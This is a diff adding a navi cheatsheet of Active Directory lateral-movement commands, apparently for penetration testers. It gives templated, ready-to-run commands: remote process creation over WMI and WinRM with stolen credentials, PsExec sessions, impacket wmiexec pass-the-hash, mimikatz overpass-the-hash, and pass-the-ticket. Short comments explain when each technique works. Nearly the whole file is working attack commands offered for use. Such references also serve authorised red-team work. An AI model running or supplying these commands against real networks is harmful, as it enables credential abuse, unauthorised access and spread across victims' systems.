@@ -1,0 +1,80 @@
+% lateral movement, wmi, active directory
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+; Lateral movement via WMI
+; Can use wmic to abuse WMI but the tool is deprecated so wont bother including it
+
+# Run command as domain user via wmi using powershell
+ $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
+ $credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
+ 
+ $options = New-CimSessionOption -Protocol DCOM
+ $session = New-Cimsession -ComputerName <host_address> -Credential $credential -SessionOption $Options 
+ $command = '<COMMAND>';
+
+ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+
+% lateral movement, winrm, active directory
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+; Lateral movement via WinRM
+
+# Run command as domain user via winrm using winrs
+winrs -r:<host_address> -u:<username> -p:<password>  "<COMMAND>"
+
+# Start remote PS session as domain user via winrm using powershell remoting
+ $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
+ $credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
+New-PSSession -ComputerName <host_address> -Credential $credential
+Enter-PSSession <SESSION_NUMBER>
+$ SESSION_NUMBER: echo "\(replace this with session number that is returned after creating the session\)"
+
+% lateral movement, psexec, active directory, sysinternals
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+; Lateral movement using sysinternals suite
+
+# Start remote PS session as domain user using psexec
+.\PsExec64.exe -i \\<host_address> -u <domain>\<username> -p <password> powershell
+
+
+% lateral movement, pass the hash, impacket, active directory
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+; Lateral movement via Pass the Hash using impacket
+; Remember PtH only works against servers or services that use NTLM auth
+; Servers or services that use Kerberos auth are not applicable
+
+# PtH of local admin to start a CMD session using impacket
+/usr/bin/impacket-wmiexec -hashes :<LOCAL_ADMIN_NTLM_HASH> Administrator@<host_address>
+
+% lateral movement, overpass the hash, mimikatz, active directory
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+; Overpass the hash involves creating a TGT using a given NTLM hash
+; Allows us to leverage an NTLM hash to interact with servers or services that use Kerberos auth
+; e.g. the official PsExec from Microsoft can run commands remotly but does not accept NTLM hashes
+; https://learn.microsoft.com/en-us/sysinternals/downloads/psexec 
+; Rhis means a PS session must have a valid TGT in order to run commands remotely via this tool
+
+# use NTLM hash to start a PS session containing valid TGT using mimikatz
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_HASH> /run:powershell
+
+
+% lateral movement, pass the ticket, mimikatz, active directory
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+; In kerberos, TGTs are typically tied to the user session it was created in
+; However TGS (service tickets) can often be reused across systems
+; Pass the Ticket exploits this behaviour by exporting and re-injecting a service ticket elsewhere
+; If im reusing a service ticket that belongs to a **different user** then i _will_ need local admin 
+; If im reusing a service ticket that belongs to the **current user** then i _dont_ need local admin
+
+# Reuse a service ticket (TGS) using mimikatz
+kerberos::ptt <TICKET_NAME>
